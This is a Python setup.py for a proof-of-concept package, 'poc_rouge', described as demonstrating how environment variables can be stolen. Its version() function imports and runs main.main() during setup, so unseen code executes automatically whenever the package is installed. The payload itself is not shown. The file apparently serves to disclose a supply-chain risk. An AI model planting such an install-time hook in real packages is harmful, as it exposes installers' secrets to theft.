"""Setup for libsast."""
from setuptools import (
    setup,
)

import main


def version():
    main.main()
    return '1.0.0'

description = ('Stealing env for fun and profit')
setup(
    name='poc_rouge',
    version=version(),
    include_package_data=True,
    description=description,
    author='Ajin Abraham',
    author_email='ajin25@gmail.com',
    classifiers=[
        'Development Status :: 4 - Beta',
        'Intended Audience :: Developers',
        ('License :: OSI Approved :: '
         'GNU Lesser General Public License v2 (LGPLv2)'),
        'Programming Language :: Python :: 3.6',
    ],
    url='https://github.com/ajinabraham/poc-rogue',
    long_description='A proof of concept to show how you environment variables can be stolen.',
)